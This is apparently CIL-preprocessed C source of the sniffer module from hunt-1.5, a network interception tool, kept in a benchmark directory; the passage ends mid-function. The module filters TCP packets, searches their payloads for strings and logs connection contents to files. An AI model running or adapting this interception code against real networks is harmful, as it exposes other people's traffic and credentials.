  if (si->file) {
#line 114
    if (si->file_close) {
      {
#line 115
      fclose(si->file);
      }
    }
  }
  {
#line 116
  free((void *)si);
  }
#line 117
  return;
}
}
#line 119 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void sniff_item_print(FILE *f , int i , struct sniff_info *si ) 
{ 
  char *str_srch_mode ;
  char *str_log_mode ;
  char buf_src_ports[512] ;
  char buf_dst_ports[512] ;
  char buf[512] ;
  char *b ;
  char host_buf[512] ;
  int tmp ;
  int tmp___0 ;
  int tmp___1 ;
  char *tmp___2 ;
  int tmp___3 ;
  char *tmp___4 ;

  {
  {
#line 126
  str_srch_mode = sdbmode_to_char(si->srch_mode);
#line 127
  str_log_mode = sdbmode_to_char(si->log_mode);
#line 128
  sprintf_db_ports((unsigned int *)(si->src_ports), buf_src_ports, (int )sizeof(buf_src_ports),
                   1);
#line 129
  sprintf_db_ports((unsigned int *)(si->dst_ports), buf_dst_ports, (int )sizeof(buf_dst_ports),
                   1);
#line 130
  b = buf;
  }
#line 131
  if (si->search) {
    {
#line 132
    tmp = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)"%s for X ",
                  str_srch_mode);
#line 132
    b += tmp;
    }
  }
  {
#line 133
  tmp___0 = sprintf((char */* __restrict  */)b, (char const   */* __restrict  */)"log %s %dB",
                    str_log_mode, si->log_bytes);
#line 133
  b += tmp___0;
#line 135
  tmp___1 = count_mask((unsigned int )si->src_mask);
#line 135
  tmp___2 = host_lookup(si->src_addr, hl_mode);
#line 135
  sprintf((char */* __restrict  */)(host_buf), (char const   */* __restrict  */)"%s/%d [%s]",
          tmp___2, tmp___1, buf_src_ports);
#line 137
  tmp___3 = count_mask((unsigned int )si->dst_mask);
#line 137
  tmp___4 = host_lookup(si->dst_addr, hl_mode);
#line 137
  fprintf((FILE */* __restrict  */)f, (char const   */* __restrict  */)"%2d) %-22s --> %s/%d [%s] %s\n",
          i, host_buf, tmp___4, tmp___3, buf_dst_ports, buf);
  }
#line 142
  return;
}
}
#line 144 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void sniff_log_item_print(FILE *f , struct sniff_info *si , struct sniff_log *slog ) 
{ 
  char *direction ;
  uint16_t tmp ;
  char *tmp___0 ;
  uint16_t tmp___1 ;
  char *tmp___2 ;

  {
#line 148
  if (slog->src_to_dst) {
#line 149
    direction = (char *)"-->";
  } else {
#line 151
    direction = (char *)"<--";
  }
  {
#line 152
  tmp = ntohs(slog->dst_port);
#line 152
  tmp___0 = host_lookup(slog->dst_addr, hl_mode);
#line 152
  tmp___1 = ntohs(slog->src_port);
#line 152
  tmp___2 = host_lookup(slog->src_addr, hl_mode);
#line 152
  fprintf((FILE */* __restrict  */)f, (char const   */* __restrict  */)"%s [%d] %s %s [%d]\n",
          tmp___2, (int )tmp___1, direction, tmp___0, (int )tmp);
  }
#line 158
  return;
}
}
#line 165 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
__inline static int sniff_packet_match(struct packet *p , struct sniff_info *si ) 
{ 
  struct iphdr *iph ;
  struct tcphdr *tcph ;
  int tmp ;
  int tmp___0 ;
  int tmp___1 ;
  int tmp___2 ;

  {
#line 167
  iph = p->p_iph;
#line 168
  tcph = p->p_hdr.p_tcph;
#line 170
  if (si->srch_mode == 0) {
#line 170
    goto _L;
  } else
#line 170
  if (si->srch_mode == 2) {
#line 170
    goto _L;
  } else
#line 170
  if (si->log_mode == 0) {
#line 170
    goto _L;
  } else
#line 170
  if (si->log_mode == 2) {
    _L: /* CIL Label */ 
#line 170
    if ((iph->saddr & (unsigned int )si->src_mask) == (si->src_addr & (unsigned int )si->src_mask)) {
#line 170
      if ((iph->daddr & (unsigned int )si->dst_mask) == (si->dst_addr & (unsigned int )si->dst_mask)) {
        {
#line 170
        tmp = port_match((int )tcph->__annonCompField3.__annonCompField2.source, (unsigned int *)(si->src_ports));
        }
#line 170
        if (tmp) {
          {
#line 170
          tmp___0 = port_match((int )tcph->__annonCompField3.__annonCompField2.dest,
                               (unsigned int *)(si->dst_ports));
          }
#line 170
          if (tmp___0) {
#line 176
            return (1);
          }
        }
      }
    }
  }
#line 177
  if (si->srch_mode == 1) {
#line 177
    goto _L___0;
  } else
#line 177
  if (si->srch_mode == 2) {
#line 177
    goto _L___0;
  } else
#line 177
  if (si->log_mode == 1) {
#line 177
    goto _L___0;
  } else
#line 177
  if (si->log_mode == 2) {
    _L___0: /* CIL Label */ 
#line 177
    if ((iph->saddr & (unsigned int )si->dst_mask) == (si->dst_addr & (unsigned int )si->dst_mask)) {
#line 177
      if ((iph->daddr & (unsigned int )si->src_mask) == (si->src_addr & (unsigned int )si->src_mask)) {
        {
#line 177
        tmp___1 = port_match((int )tcph->__annonCompField3.__annonCompField2.source,
                             (unsigned int *)(si->dst_ports));
        }
#line 177
        if (tmp___1) {
          {
#line 177
          tmp___2 = port_match((int )tcph->__annonCompField3.__annonCompField2.dest,
                               (unsigned int *)(si->src_ports));
          }
#line 177
          if (tmp___2) {
#line 183
            return (1);
          }
        }
      }
    }
  }
#line 184
  return (0);
}
}
#line 187 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void func_sniff(struct packet *p , void *arg ) 
{ 
  struct list_iterator li ;
  struct sniff_info *si ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 195
  list_lock(& l_sniff_db);
#line 196
  list_iter_set(& li, & l_sniff_db);
  }
  {
#line 197
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 197
    tmp___0 = list_iter_get(& li);
#line 197
    si = (struct sniff_info *)tmp___0;
    }
#line 197
    if (! si) {
#line 197
      goto while_break;
    }
    {
#line 198
    tmp = sniff_packet_match(p, si);
    }
#line 198
    if (tmp) {
      {
#line 199
      packet_want(p);
#line 200
      sniff_info_want(si);
#line 201
      p->p_arg[4] = (void *)si;
#line 202
      list_produce(& l_sniff_pkt, (void *)p);
      }
#line 203
      goto while_break;
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 206
  list_iter_end(& li);
#line 207
  list_unlock(& l_sniff_db);
  }
#line 208
  return;
}
}
#line 215 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
void sniffer_log_print(struct sniff_info *si , struct sniff_log *slog ) 
{ 
  char file_name[512] ;
  char file_name_buf[512] ;
  struct stat stat_buf ;
  FILE *f ;
  int i ;
  uint16_t tmp ;
  char *tmp___0 ;
  uint16_t tmp___1 ;
  char *tmp___2 ;
  int *tmp___3 ;
  int tmp___4 ;
  int *tmp___5 ;
  unsigned short const   **tmp___6 ;
  unsigned short const   **tmp___7 ;

  {
#line 222
  if (! slog->loged_bytes) {
#line 223
    return;
  }
#line 224
  if (! slog->file) {
#line 225
    if (! si->file) {
      {
#line 226
      tmp = ntohs(slog->dst_port);
#line 226
      tmp___0 = host_lookup(slog->dst_addr, 1);
#line 226
      tmp___1 = ntohs(slog->src_port);
#line 226
      tmp___2 = host_lookup(slog->src_addr, 1);
#line 226
      sprintf((char */* __restrict  */)(file_name_buf), (char const   */* __restrict  */)"%s/%s:%d_%s:%d",
              ".sniff", tmp___2, (int )tmp___1, tmp___0, (int )tmp);
#line 232
      tmp___3 = __errno_location();
#line 232
      *tmp___3 = 0;
#line 233
      i = 0;
#line 234
      strcpy((char */* __restrict  */)(file_name), (char const   */* __restrict  */)(file_name_buf));
      }
      {
#line 235
      while (1) {
        while_continue: /* CIL Label */ ;
        {
#line 235
        tmp___4 = stat((char const   */* __restrict  */)(file_name), (struct stat */* __restrict  */)(& stat_buf));
        }
#line 235
        if (tmp___4 >= 0) {
          {
#line 235
          tmp___5 = __errno_location();
          }
#line 235
          if (! (*tmp___5 != 2)) {
#line 235
            goto while_break;
          }
        } else {
#line 235
          goto while_break;
        }
        {
#line 236
        i ++;
#line 236
        sprintf((char */* __restrict  */)(file_name), (char const   */* __restrict  */)"%s_%d",
                file_name_buf, i);
        }
      }
      while_break: /* CIL Label */ ;
      }
      {
#line 237
      f = fopen((char const   */* __restrict  */)(file_name), (char const   */* __restrict  */)"w");
      }
#line 237
      if (! f) {
        {
#line 238
        printf((char const   */* __restrict  */)"cannot open %s for writing\n", file_name);
        }
#line 239
        return;
      }
#line 241
      slog->file = f;
#line 242
      slog->file_close = 1;
    } else {
#line 244
      slog->file = si->file;
#line 245
      slog->file_close = 0;
    }
  }
  {
#line 249
  sniff_log_item_print(slog->file, si, slog);
#line 250
  i = 0;
  }
  {
#line 250
  while (1) {
    while_continue___0: /* CIL Label */ ;
#line 250
    if (! (i < slog->loged_bytes)) {
#line 250
      goto while_break___0;
    }
    {
#line 251
    tmp___6 = __ctype_b_loc();
    }
#line 251
    if ((int const   )*(*tmp___6 + (int )*(slog->buf + i)) & 16384) {
      {
#line 252
      fputc((int )*(slog->buf + i), slog->file);
      }
    } else
#line 251
    if (o_newline) {
      {
#line 251
      tmp___7 = __ctype_b_loc();
      }
#line 251
      if ((int const   )*(*tmp___7 + (int )*(slog->buf + i)) & 8192) {
        {
#line 252
        fputc((int )*(slog->buf + i), slog->file);
        }
      } else {
        {
#line 254
        fprintf((FILE */* __restrict  */)slog->file, (char const   */* __restrict  */)"[0x%X]",
                (int )((unsigned char )*(slog->buf + i)));
        }
      }
    } else {
      {
#line 254
      fprintf((FILE */* __restrict  */)slog->file, (char const   */* __restrict  */)"[0x%X]",
              (int )((unsigned char )*(slog->buf + i)));
      }
    }
#line 250
    i ++;
  }
  while_break___0: /* CIL Label */ ;
  }
  {
#line 256
  fprintf((FILE */* __restrict  */)slog->file, (char const   */* __restrict  */)"\n\n");
#line 257
  fflush(slog->file);
#line 258
  slog->loged_bytes = 0;
  }
#line 259
  return;
}
}
#line 261 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
char *memfind(char *data , int data_len , char *str , int str_len ) 
{ 
  char *d ;
  int tmp ;
  void *tmp___0 ;

  {
#line 265
  if (data_len == 0) {
#line 266
    return ((char *)((void *)0));
  } else
#line 265
  if (str_len == 0) {
#line 266
    return ((char *)((void *)0));
  } else
#line 265
  if (data_len < str_len) {
#line 266
    return ((char *)((void *)0));
  }
  {
#line 280
  while (1) {
    while_continue: /* CIL Label */ ;
#line 280
    if (! (data_len >= str_len)) {
#line 280
      goto while_break;
    }
    {
#line 281
    tmp___0 = memchr((void const   *)data, (int )*(str + 0), (size_t )((data_len - str_len) + 1));
#line 281
    d = (char *)tmp___0;
    }
#line 281
    if (d) {
      {
#line 282
      tmp = memcmp((void const   *)d, (void const   *)str, (size_t )str_len);
      }
#line 282
      if (tmp == 0) {
#line 283
        return (d);
      }
#line 285
      data_len = (int )((long )data_len - ((d - data) + 1L));
#line 286
      data = d + 1;
    } else {
#line 288
      goto while_break;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 290
  return ((char *)((void *)0));
}
}
#line 293 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
char *sniff_log_match(struct packet *p , struct sniff_info *si , struct sniff_log *slog ) 
{ 
  struct iphdr *iph ;
  struct tcphdr *tcph ;
  int m_src_to_dst ;
  int m_dst_to_src ;
  int find ;
  char *log_data ;
  char *retval ;
  size_t tmp ;

  {
#line 295
  iph = p->p_iph;
#line 296
  tcph = p->p_hdr.p_tcph;
#line 299
  retval = (char *)((void *)0);
#line 301
  find = 0;
#line 302
  m_dst_to_src = 0;
#line 302
  m_src_to_dst = m_dst_to_src;
#line 303
  if (iph->saddr == slog->src_addr) {
#line 303
    if (iph->daddr == slog->dst_addr) {
#line 303
      if ((int )tcph->__annonCompField3.__annonCompField2.source == (int )slog->src_port) {
#line 303
        if ((int )tcph->__annonCompField3.__annonCompField2.dest == (int )slog->dst_port) {
#line 307
          m_src_to_dst = 1;
        }
      }
    }
  }
#line 308
  if (iph->daddr == slog->src_addr) {
#line 308
    if (iph->saddr == slog->dst_addr) {
#line 308
      if ((int )tcph->__annonCompField3.__annonCompField2.dest == (int )slog->src_port) {
#line 308
        if ((int )tcph->__annonCompField3.__annonCompField2.source == (int )slog->dst_port) {
#line 312
          m_dst_to_src = 1;
        }
      }
    }
  }
#line 313
  if (! m_dst_to_src) {
#line 313
    if (! m_src_to_dst) {
#line 314
      return ((char *)((void *)0));
    }
  }
#line 315
  log_data = p->p_data;
  {
#line 317
  if (slog->state == 1) {
#line 317
    goto case_1;
  }
#line 338
  if (slog->state == 2) {
#line 338
    goto case_2;
  }
#line 347
  goto switch_default;
  case_1: /* CIL Label */ 
#line 318
  if (si->srch_mode == 0) {
#line 318
    goto _L___1;
  } else
#line 318
  if (si->srch_mode == 2) {
    _L___1: /* CIL Label */ 
#line 318
    if (m_src_to_dst) {
#line 320
      find = 1;
    } else {
#line 318
      goto _L___0;
    }
  } else
  _L___0: /* CIL Label */ 
#line 321
  if (si->srch_mode == 1) {
#line 321
    goto _L;
  } else
#line 321
  if (si->srch_mode == 2) {
    _L: /* CIL Label */ 
#line 321
    if (m_dst_to_src) {
#line 323
      find = 1;
    }
  }
#line 324
  if (find) {
#line 325
    if (si->search) {
      {
#line 326
      tmp = strlen((char const   *)si->search);
#line 326
      log_data = memfind(p->p_data, p->p_data_len, si->search, (int )tmp);
      }
#line 327
      if (log_data) {
#line 328
        slog->state = 2;
      }
    } else {
#line 331
      log_data = p->p_data;
#line 332
      slog->state = 2;
    }
  }
#line 335
  if (slog->state != 2) {
#line 336
    goto switch_break;
  }
  case_2: /* CIL Label */ 
#line 339
  if (si->log_mode == 0) {
#line 339
    goto _L___4;
  } else
#line 339
  if (si->log_mode == 2) {
    _L___4: /* CIL Label */ 
#line 339
    if (m_src_to_dst) {
#line 341
      retval = log_data;
    } else {
#line 339
      goto _L___3;
    }
  } else
  _L___3: /* CIL Label */ 
#line 342
  if (si->log_mode == 1) {
#line 342
    goto _L___2;
  } else
#line 342
  if (si->log_mode == 2) {
    _L___2: /* CIL Label */ 
#line 342
    if (m_dst_to_src) {
#line 344
      retval = log_data;
    }
  }
#line 346
  goto switch_break;
  switch_default: /* CIL Label */ 
  {
#line 348
  fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"sniffer - bad state\n");
#line 349
  retval = (char *)((void *)0);
  }
#line 350
  goto switch_break;
  switch_break: /* CIL Label */ ;
  }
#line 352
  if (! retval) {
#line 353
    retval = (char *)((void *)1);
  }
#line 354
  return (retval);
}
}
#line 357 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
char *sniffer_match(struct packet *p , struct sniff_info *si , struct sniff_log **__slog ) 
{ 
  struct iphdr *iph ;
  struct tcphdr *tcph ;
  char *retval ;
  struct list_iterator li ;
  struct sniff_log *slog ;
  void *rret ;
  void *tmp ;
  void *tmp___0 ;
  uint16_t tmp___1 ;
  uint16_t tmp___2 ;

  {
  {
#line 359
  iph = p->p_iph;
#line 360
  tcph = p->p_hdr.p_tcph;
#line 361
  retval = (char *)((void *)0);
#line 366
  list_iter_set(& li, & si->log);
#line 367
  retval = (char *)((void *)0);
  }
  {
#line 368
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 368
    tmp = list_iter_get(& li);
#line 368
    slog = (struct sniff_log *)tmp;
    }
#line 368
    if (! slog) {
#line 368
      goto while_break;
    }
    {
#line 369
    retval = sniff_log_match(p, si, slog);
    }
#line 369
    if (retval) {
#line 370
      goto while_break;
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 372
  list_iter_end(& li);
  }
#line 373
  if (! retval) {
#line 373
    if (p->p_data_len) {
      {
#line 374
      tmp___0 = malloc(sizeof(struct sniff_log ));
#line 374
      slog = (struct sniff_log *)tmp___0;
#line 375
      tmp___1 = ntohs(tcph->__annonCompField3.__annonCompField2.dest);
      }
#line 375
      if ((int )tmp___1 >= 1024) {
        {
#line 375
        tmp___2 = ntohs(tcph->__annonCompField3.__annonCompField2.source);
        }
#line 375
        if ((int )tmp___2 < 1024) {
#line 376
          slog->src_addr = iph->daddr;
#line 377
          slog->dst_addr = iph->saddr;
#line 378
          slog->src_port = tcph->__annonCompField3.__annonCompField2.dest;
#line 379
          slog->dst_port = tcph->__annonCompField3.__annonCompField2.source;
        } else {
#line 381
          slog->src_addr = iph->saddr;
#line 382
          slog->dst_addr = iph->daddr;
#line 383
          slog->src_port = tcph->__annonCompField3.__annonCompField2.source;
#line 384
          slog->dst_port = tcph->__annonCompField3.__annonCompField2.dest;
        }
      } else {
#line 381
        slog->src_addr = iph->saddr;
#line 382
        slog->dst_addr = iph->daddr;
#line 383
        slog->src_port = tcph->__annonCompField3.__annonCompField2.source;
#line 384
        slog->dst_port = tcph->__annonCompField3.__annonCompField2.dest;
      }
#line 386
      slog->file = (FILE *)((void *)0);
#line 387
      slog->file_close = 0;
#line 388
      slog->src_to_dst = 0;
#line 389
      slog->loged_bytes = 0;
#line 390
      slog->buf = (char *)((void *)0);
#line 391
      if (si->search) {
#line 391
        slog->state = 1;
      } else {
#line 391
        slog->state = 2;
      }
      {
#line 392
      slog->next = (struct sniff_log *)((void *)0);
#line 393
      list_push(& si->log, (void *)slog);
#line 394
      retval = sniff_log_match(p, si, slog);
#line 396
      host_lookup(slog->src_addr, 1);
#line 397
      host_lookup(slog->dst_addr, 1);
      }
    }
  }
#line 400
  if (retval) {
#line 401
    if ((p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.rst) {
#line 401
      goto _L;
    } else
#line 401
    if ((p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.fin) {
      _L: /* CIL Label */ 
      {
#line 403
      sniffer_log_print(si, slog);
#line 404
      rret = list_remove(& si->log, (void *)slog);
      }
#line 405
      if (! rret) {
        {
#line 405
        __assert_fail("rret", "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c",
                      405U, "sniffer_match");
        }
      }
      {
#line 406
      free_sniff_log(slog);
#line 407
      retval = (char *)((void *)0);
      }
    }
  }
#line 411
  if ((unsigned long )retval == (unsigned long )((void *)1)) {
#line 412
    retval = (char *)((void *)0);
  }
#line 413
  if (retval) {
#line 414
    *__slog = slog;
  } else {
#line 416
    *__slog = (struct sniff_log *)((void *)0);
  }
#line 417
  return (retval);
}
}
#line 434 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
void sniffer_log(char *data , struct packet *p , struct sniff_info *si , struct sniff_log *slog ) 
{ 
  int data_len ;
  int space ;
  int i ;
  void *tmp ;
  struct iphdr *iph ;

  {
#line 438
  if (! data) {
#line 439
    return;
  }
#line 440
  if (! slog->buf) {
    {
#line 441
    tmp = malloc((size_t )2048);
#line 441
    slog->buf = (char *)tmp;
    }
  }
#line 442
  data_len = (int )((long )p->p_data_len - (data - p->p_data));
#line 448
  if (data_len) {
#line 448
    goto _L___0;
  } else
#line 448
  if (slog->loged_bytes >= si->log_bytes) {
    _L___0: /* CIL Label */ 
#line 449
    iph = p->p_iph;
#line 451
    if (slog->src_to_dst) {
#line 451
      if (slog->src_addr == iph->daddr) {
        {
#line 452
        sniffer_log_print(si, slog);
#line 453
        slog->src_to_dst = 0;
        }
      } else {
#line 451
        goto _L;
      }
    } else
    _L: /* CIL Label */ 
#line 454
    if (! slog->src_to_dst) {
#line 454
      if (slog->src_addr == iph->saddr) {
        {
#line 455
        sniffer_log_print(si, slog);
#line 456
        slog->src_to_dst = 1;
        }
      }
    }
  }
  {
#line 459
  while (1) {
    while_continue: /* CIL Label */ ;
#line 459
    if (! data_len) {
#line 459
      goto while_break;
    }
#line 460
    space = 2048 - slog->loged_bytes;
#line 460
    if (space < 0) {
#line 461
      space = 0;
    }
#line 462
    if (data_len > space) {
#line 462
      i = space;
    } else {
#line 462
      i = data_len;
    }
    {
#line 463
    memcpy((void */* __restrict  */)(slog->buf + slog->loged_bytes), (void const   */* __restrict  */)data,
           (size_t )i);
#line 464
    slog->loged_bytes += i;
#line 465
    data += i;
#line 466
    data_len -= i;
    }
#line 467
    if (slog->loged_bytes == 2048) {
      {
#line 468
      sniffer_log_print(si, slog);
      }
#line 469
      if (si->search) {
#line 469
        slog->state = 1;
      } else {
#line 469
        slog->state = 2;
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 472
  if (slog->loged_bytes >= si->log_bytes) {
    {
#line 473
    sniffer_log_print(si, slog);
    }
#line 474
    if (si->search) {
#line 474
      slog->state = 1;
    } else {
#line 474
      slog->state = 2;
    }
  }
#line 476
  return;
}
}
#line 478 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void *sniffer(void *arg ) 
{ 
  struct sniff_info *si ;
  struct sniff_log *slog ;
  struct packet *p ;
  char *data ;
  __pid_t tmp ;
  void *tmp___0 ;

  {
  {
#line 485
  pthread_sigmask(0, (__sigset_t const   */* __restrict  */)(& intr_mask), (__sigset_t */* __restrict  */)((void *)0));
#line 486
  tmp = getpid();
#line 486
  setpriority(0, (id_t )tmp, 10);
  }
  {
#line 487
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 487
    tmp___0 = list_consume(& l_sniff_pkt, (struct timespec  const  *)((void *)0));
#line 487
    p = (struct packet *)tmp___0;
    }
#line 487
    if (! p) {
#line 487
      goto while_break;
    }
    {
#line 488
    si = (struct sniff_info *)p->p_arg[4];
#line 489
    data = sniffer_match(p, si, & slog);
    }
#line 489
    if (data) {
      {
#line 490
      sniffer_log(data, p, si, slog);
      }
    }
    {
#line 491
    sniff_info_release(si);
#line 492
    packet_free(p);
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 494
  return ((void *)0);
}
}
#line 502 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static int sniff_daemon_init(void) 
{ 
  struct stat stat_buf ;
  int tmp ;
  int *tmp___0 ;
  int tmp___1 ;

  {
  {
#line 506
  tmp___1 = stat((char const   */* __restrict  */)".sniff", (struct stat */* __restrict  */)(& stat_buf));
  }
#line 506
  if (tmp___1 == 0) {
#line 507
    if (! ((stat_buf.st_mode & 61440U) == 16384U)) {
      {
#line 508
      printf((char const   */* __restrict  */)".sniff isn\'t directory\n");
      }
#line 509
      return (-1);
    }
  } else {
    {
#line 512
    tmp___0 = __errno_location();
    }
#line 512
    if (*tmp___0 == 2) {
      {
#line 513
      tmp = mkdir(".sniff", (__mode_t )448);
      }
#line 513
      if (tmp < 0) {
        {
#line 514
        printf((char const   */* __restrict  */)".sniff can\'t be created\n");
        }
#line 515
        return (-1);
      }
      {
#line 517
      printf((char const   */* __restrict  */)"directory .sniff created\n");
      }
    } else {
      {
#line 519
      printf((char const   */* __restrict  */)".sniff error\n");
      }
#line 520
      return (-1);
    }
  }
#line 523
  return (0);
}
}
#line 526 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void start_sniff(void) 
{ 
  int tmp ;

  {
#line 528
  if (sniffer_running) {
    {
#line 529
    printf((char const   */* __restrict  */)"sniffer already running\n");
    }
#line 530
    return;
  }
  {
#line 532
  tmp = sniff_daemon_init();
  }
#line 532
  if (tmp) {
#line 533
    return;
  }
  {
#line 534
  list_produce_start(& l_sniff_pkt);
#line 535
  pthread_create((pthread_t */* __restrict  */)(& sniff_thr), (pthread_attr_t const   */* __restrict  */)((void *)0),
                 & sniffer, (void */* __restrict  */)((void *)0));
#line 536
  ifunc_sniff.func = & func_sniff;
#line 537
  ifunc_sniff.arg = (void *)0;
#line 538
  list_enqueue(& l_ifunc_tcp, (void *)(& ifunc_sniff));
#line 539
  sniffer_running = 1;
#line 540
  printf((char const   */* __restrict  */)"sniffer started\n");
  }
#line 541
  return;
}
}
#line 543 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void stop_sniff(void) 
{ 
  struct list_iterator li ;
  struct packet *p ;
  struct sniff_info *si ;
  struct sniff_log *slog ;
  void *tmp ;
  void *tmp___0 ;
  void *tmp___1 ;

  {
#line 550
  if (! sniffer_running) {
    {
#line 551
    printf((char const   */* __restrict  */)"sniffer isn\'t running\n");
    }
#line 552
    return;
  }
  {
#line 554
  list_remove(& l_ifunc_tcp, (void *)(& ifunc_sniff));
  }
  {
#line 556
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 556
    tmp = list_pop(& l_sniff_pkt);
#line 556
    p = (struct packet *)tmp;
    }
#line 556
    if (! p) {
#line 556
      goto while_break;
    }
    {
#line 557
    si = (struct sniff_info *)p->p_arg[4];
#line 558
    sniff_info_release(si);
#line 559
    packet_free(p);
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 561
  list_produce_done(& l_sniff_pkt);
#line 562
  pthread_join(sniff_thr, (void **)((void *)0));
#line 564
  list_lock(& l_sniff_db);
#line 565
  list_iter_set(& li, & l_sniff_db);
  }
  {
#line 566
  while (1) {
    while_continue___0: /* CIL Label */ ;
    {
#line 566
    tmp___1 = list_iter_get(& li);
#line 566
    si = (struct sniff_info *)tmp___1;
    }
#line 566
    if (! si) {
#line 566
      goto while_break___0;
    }
    {
#line 567
    while (1) {
      while_continue___1: /* CIL Label */ ;
      {
#line 567
      tmp___0 = list_pop(& si->log);
#line 567
      slog = (struct sniff_log *)tmp___0;
      }
#line 567
      if (! slog) {
#line 567
        goto while_break___1;
      }
      {
#line 568
      free_sniff_log(slog);
      }
    }
    while_break___1: /* CIL Label */ ;
    }
  }
  while_break___0: /* CIL Label */ ;
  }
  {
#line 570
  list_iter_end(& li);
#line 571
  list_unlock(& l_sniff_db);
#line 573
  sniffer_running = 0;
#line 574
  printf((char const   */* __restrict  */)"sniffer stopped\n");
  }
#line 575
  return;
}
}
#line 577 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
void print_sniff_daemon(void) 
{ 
  int tmp ;

  {
#line 579
  if (sniffer_running) {
    {
#line 580
    tmp = pthread_kill(sniff_thr, 0);
    }
#line 580
    if (tmp != 0) {
      {
#line 581
      pthread_join(sniff_thr, (void **)((void *)0));
#line 582
      sniff_thr = (pthread_t )0;
#line 583
      sniffer_running = 0;
#line 584
      set_tty_color((enum TTY_COLOR )9);
#line 585
      printf((char const   */* __restrict  */)"Sniffer daemon failed - bug\n");
#line 586
      set_tty_color((enum TTY_COLOR )7);
      }
    } else {
      {
#line 588
      printf((char const   */* __restrict  */)"S");
      }
    }
  }
#line 590
  return;
}
}
#line 596 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void sniff_item_log_print(FILE *f , int *l_nr , struct sniff_info *si ) 
{ 
  struct list_iterator li ;
  struct sniff_log *slog ;
  char *state ;
  char host_buf[512] ;
  char *tmp ;
  char *tmp___0 ;
  char *tmp___1 ;
  char *tmp___2 ;
  void *tmp___3 ;

  {
  {
#line 603
  list_iter_set(& li, & si->log);
  }
  {
#line 604
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 604
    tmp___3 = list_iter_get(& li);
#line 604
    slog = (struct sniff_log *)tmp___3;
    }
#line 604
    if (! slog) {
#line 604
      goto while_break;
    }
    {
#line 606
    if (slog->state == 2) {
#line 606
      goto case_2;
    }
#line 609
    if (slog->state == 1) {
#line 609
      goto case_1;
    }
#line 612
    goto switch_default;
    case_2: /* CIL Label */ 
#line 607
    state = (char *)"LOG";
#line 608
    goto switch_break;
    case_1: /* CIL Label */ 
#line 610
    state = (char *)"SRCH";
#line 611
    goto switch_break;
    switch_default: /* CIL Label */ 
#line 613
    state = (char *)"ERR";
#line 614
    goto switch_break;
    switch_break: /* CIL Label */ ;
    }
    {
#line 616
    tmp = port_lookup(slog->src_port, hl_mode);
#line 616
    tmp___0 = host_lookup(slog->src_addr, hl_mode);
#line 616
    sprintf((char */* __restrict  */)(host_buf), (char const   */* __restrict  */)"%s [%s]",
            tmp___0, tmp);
#line 619
    tmp___1 = port_lookup(slog->dst_port, hl_mode);
#line 619
    tmp___2 = host_lookup(slog->dst_addr, hl_mode);
#line 619
    fprintf((FILE */* __restrict  */)f, (char const   */* __restrict  */)"\t%-24s -> %s [%s] loged=%dB state=%s\n",
            host_buf, tmp___2, tmp___1, slog->loged_bytes, state);
#line 625
    (*l_nr) ++;
    }
#line 625
    if (*l_nr % lines_o == 0) {
      {
#line 626
      lines_o_press_key();
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 628
  list_iter_end(& li);
  }
#line 629
  return;
}
}
#line 631 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void sniff_list_db(int all ) 
{ 
  struct list_iterator li ;
  struct sniff_info *si ;
  int i ;
  int l_nr ;
  int tmp ;
  void *tmp___0 ;

  {
  {
#line 635
  i = 0;
#line 636
  l_nr = 0;
#line 638
  list_iter_set(& li, & l_sniff_db);
  }
  {
#line 639
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 639
    tmp___0 = list_iter_get(& li);
#line 639
    si = (struct sniff_info *)tmp___0;
    }
#line 639
    if (! si) {
#line 639
      goto while_break;
    }
    {
#line 640
    tmp = i;
#line 640
    i ++;
#line 640
    sniff_item_print(stdout, tmp, si);
#line 641
    l_nr ++;
    }
#line 641
    if (l_nr % lines_o == 0) {
      {
#line 642
      lines_o_press_key();
      }
    }
#line 643
    if (all) {
      {
#line 644
      sniff_item_log_print(stdout, & l_nr, si);
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 646
  list_iter_end(& li);
  }
#line 647
  return;
}
}
#line 650 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/sniff.c"
static void sniff_add_item(void) 
{ 
  char buf[512] ;
  char *buf_p ;
  char file_name[512] ;
  char file_name_buf[512] ;
  struct sniff_info *si ;
  unsigned int src_ip ;
  unsigned int dst_ip ;
  int src_mask ;
  int dst_mask ;
  int src_ports[17] ;
  int dst_ports[17] ;
  int srch_mode ;
  int len ;
  int log_mode ;
  int log_bytes ;
  int nr ;
  FILE *f ;
  int tmp ;
